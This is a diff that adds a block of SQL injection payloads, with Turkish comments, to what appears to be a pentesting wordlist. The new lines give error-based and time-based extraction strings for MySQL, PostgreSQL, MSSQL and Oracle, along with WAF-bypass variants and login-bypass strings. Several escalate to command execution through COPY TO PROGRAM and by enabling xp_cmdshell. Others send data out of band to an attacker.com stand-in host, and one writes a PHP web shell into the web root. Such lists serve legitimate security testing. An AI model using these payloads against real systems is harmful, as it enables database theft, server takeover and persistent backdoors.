@@ -413,3 +413,49 @@ a"or"1"="1
 ' or '1'='1#
 ') or ('1'='1
 ')) or (('1'='1
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# modern hata-tabanlı (tüm DB) + JSON-SQLi + RCE eskalasyonu
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -
+' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)-- -
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+' RLIKE SLEEP(5)-- -
+'||(SELECT SLEEP(5))||'
+'+(SELECT 0 FROM (SELECT SLEEP(5))x)+'
+1 AND (SELECT 1 FROM (SELECT SLEEP(5))A)
+# PostgreSQL zaman + RCE (COPY ... TO/FROM PROGRAM)
+' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -
+'||(SELECT '' FROM pg_sleep(5))||'
+' AND 1=CAST((SELECT version()) AS INT)-- -
+'; COPY (SELECT '') TO PROGRAM 'id'-- -
+'; CREATE TABLE cmd_exec(c text); COPY cmd_exec FROM PROGRAM 'id'-- -
+# MSSQL stacked + xp_cmdshell aktivasyon
+' AND 1=CONVERT(int,(SELECT @@version))-- -
+'; EXEC xp_cmdshell('whoami')-- -
+'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -
+'; EXEC master..xp_dirtree '//attacker.com/a'-- -
+# Oracle
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+' UNION SELECT banner,NULL FROM v$version-- -
+# WAF bypass (versioned comment / whitespace / scientific notation)
+'/*!50000AND*/SLEEP(5)-- -
+'/*!12345UNION*//*!12345SELECT*/1,2,3-- -
+'%0aAND%0aSLEEP(5)-- -
+'%0bAND%0bSLEEP(5)-- -
+'%a0AND%a0SLEEP(5)-- -
+' AND 1.e1=1.e1-- -
+'=0-- -
+# JSON path operatörü tabanlı (MySQL 5.7+/PostgreSQL)
+'->>'$.x
+'->'$.a'='
+# auth bypass kısa varyantlar
+admin'-- -
+admin'#
+admin'/*
+admin' OR '1'='1'#
+" OR ""="
+# OOB / dosya yazma
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a')))-- -
+' UNION SELECT '<?php system($_GET[c]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -
